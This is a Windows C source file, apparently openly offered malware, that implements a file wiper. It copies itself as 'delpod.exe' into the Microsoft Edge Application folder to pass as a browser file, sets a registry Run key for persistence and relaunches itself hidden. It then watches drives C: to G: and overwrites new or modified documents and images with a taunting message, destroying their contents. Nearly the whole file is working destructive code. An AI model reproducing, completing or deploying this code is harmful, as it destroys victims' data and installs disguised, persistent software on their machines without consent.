// delete.c by IHEfty
// Drops “delpod.exe” into Edge\Application, installs it to autorun on startup,
// then launches it hidden. delpod.exe continuously monitors and overwrites files.

#include <windows.h>
#include <shlwapi.h>    
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "shlwapi.lib")

const char* EXTENSIONS[] = {
    ".txt", ".docx", ".xlsx", ".pdf",
    ".jpg", ".jpeg", ".png", ".bmp"      // file type
};
const int EXT_COUNT = sizeof(EXTENSIONS) / sizeof(EXTENSIONS[0]);

const char* TARGET_FOLDERS[] = {
    "C:\\", "D:\\", "E:\\", "F:\\", "G:\\" //targersss
};
const int TARGET_COUNT = sizeof(TARGET_FOLDERS) / sizeof(TARGET_FOLDERS[0]);

const char* MESSAGE = "Wooh Delete delete delete........";
const char* RUN_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const char* AUTORUN_NAME = "delpod";

int has_extension(const char* name) {
    for (int i = 0; i < EXT_COUNT; i++) {
        size_t nlen = strlen(name), elen = strlen(EXTENSIONS[i]);
        if (nlen >= elen && _stricmp(name + nlen - elen, EXTENSIONS[i]) == 0)
            return 1;
    }
    return 0;
}

void overwrite_file(const char* path) {
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                           FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(h, MESSAGE, (DWORD)strlen(MESSAGE), &written, NULL);
        CloseHandle(h);
    }
}

DWORD WINAPI watch_drive(LPVOID param) {
    const char* root = (const char*)param;
    HANDLE hDir = CreateFileA(
        root,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL
    );
    if (hDir == INVALID_HANDLE_VALUE) return 1;

    BYTE buffer[1024];
    OVERLAPPED ov = {0};

    while (1) {
        DWORD bytesReturned = 0;
        ReadDirectoryChangesW(
            hDir, buffer, sizeof(buffer), TRUE,
            FILE_NOTIFY_CHANGE_FILE_NAME |
            FILE_NOTIFY_CHANGE_DIR_NAME  |
            FILE_NOTIFY_CHANGE_LAST_WRITE,
            &bytesReturned, &ov, NULL
        );
        WaitForSingleObject(ov.hEvent, INFINITE);
        FILE_NOTIFY_INFORMATION* fni = (FILE_NOTIFY_INFORMATION*)buffer;
        do {
            char filename[MAX_PATH];
            int len = WideCharToMultiByte(
                CP_ACP, 0,
                fni->FileName,
                fni->FileNameLength / sizeof(WCHAR),
                filename, MAX_PATH - 1, NULL, NULL
            );
            filename[len] = '\0';

            if ((fni->Action == FILE_ACTION_ADDED || fni->Action == FILE_ACTION_MODIFIED)
                && has_extension(filename)) {
                char fullpath[MAX_PATH];
                snprintf(fullpath, MAX_PATH, "%s\\%s", root, filename);
                overwrite_file(fullpath);
            }
            if (!fni->NextEntryOffset) break;
            fni = (FILE_NOTIFY_INFORMATION*)((BYTE*)fni + fni->NextEntryOffset);
        } while (1);
    }
    CloseHandle(hDir);
    return 0;
}
// Get this executable’s full path
void get_self_path(char* out, DWORD size) {
    GetModuleFileNameA(NULL, out, size);
}

int path_equals(const char* a, const char* b) {
    return _stricmp(a, b) == 0;
}

void set_autorun(const char* exePath) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, RUN_KEY, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL,
                        &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, AUTORUN_NAME, 0, REG_SZ,
                       (const BYTE*)exePath, (DWORD)strlen(exePath) + 1);
        RegCloseKey(hKey);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    char selfPath[MAX_PATH];
    get_self_path(selfPath, MAX_PATH);

    const char* installDir = 
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\";
    char targetPath[MAX_PATH];
    snprintf(targetPath, MAX_PATH, "%sdelpod.exe", installDir);

    if (!path_equals(selfPath, targetPath)) {
        CreateDirectoryA(installDir, NULL);
        CopyFileA(selfPath, targetPath, FALSE);

        set_autorun(targetPath);

        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        sei.lpVerb = "open";
        sei.lpFile = targetPath;
        sei.nShow = SW_HIDE;
        ShellExecuteExA(&sei);
        return 0;
    }

    HANDLE threads[TARGET_COUNT];
    for (int i = 0; i < TARGET_COUNT; i++) {
        DWORD attr = GetFileAttributesA(TARGET_FOLDERS[i]);
        if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) {
            threads[i] = CreateThread(
                NULL, 0, watch_drive,
                (LPVOID)TARGET_FOLDERS[i], 0, NULL
            );
        } else threads[i] = NULL;
    }
    WaitForMultipleObjects(TARGET_COUNT, threads, TRUE, INFINITE);
    return 0;
}
